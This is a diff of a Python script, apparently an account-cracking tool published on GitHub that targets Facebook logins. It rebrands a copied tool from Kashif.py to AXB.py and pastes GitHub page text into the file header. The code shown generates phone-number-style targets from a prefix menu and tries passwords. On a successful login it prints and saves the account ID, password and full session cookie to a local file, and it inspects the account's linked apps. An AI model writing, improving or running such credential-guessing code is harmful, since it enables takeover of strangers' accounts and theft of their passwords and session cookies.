@@ -1,4 +1,18 @@
-1 contributor
+
+/
+open-source
+Public
+Code
+Issues
+Pull requests
+Actions
+Projects
+Security
+Insights
+open-source/AXB.py
+@AXB
+AXB Add files via upload
+ 1 contributor
 265 lines (252 sloc)  10.1 KB
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
@@ -11,7 +25,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python Kashif.py')
+    os.system('python AXB.py')
 from bs4 import BeautifulSoup
 ugen = []
 A = '\x1b[1;97m' 
@@ -109,7 +123,7 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS 🎮%s  '%(ORANGE))
+        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS%s  '%(ORANGE))
     else:
         print(f'\r {GREEN}[√] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
         for i in range(len(game)):
@@ -121,9 +135,9 @@ def cek_apk(session,coki):
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS 🎮%s'%(ORANGE))
+        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS %s'%(ORANGE))
     else:
-        print(f'\r 🎮  %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
+        print(f'\r %{RED}sYOUR EXPIRED APKS DETAILS :'%(RED))
         for i in range(len(game)):
             print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
             print(f"{GREEN}[√]---------------------------------------------------[√]")
@@ -162,7 +176,7 @@ def Random():
     print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
     print(f"")
     linex()
-    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
+    print(f"        \x1b[97m[\033[95;42mEXAMPLE :\033[0;m]")
     print(f"")
     print(' 0306 ,0300 ,0315 ,0333')
     print(f" 0341 ,0342 ,0345 ,0349")
@@ -232,7 +246,7 @@ def free(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\033[1;32m[√]---------------------[JADU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
+                print('\r\033[1;32m[√]---------------------[AXB-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
                 open('/sdcard/Jadugar-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
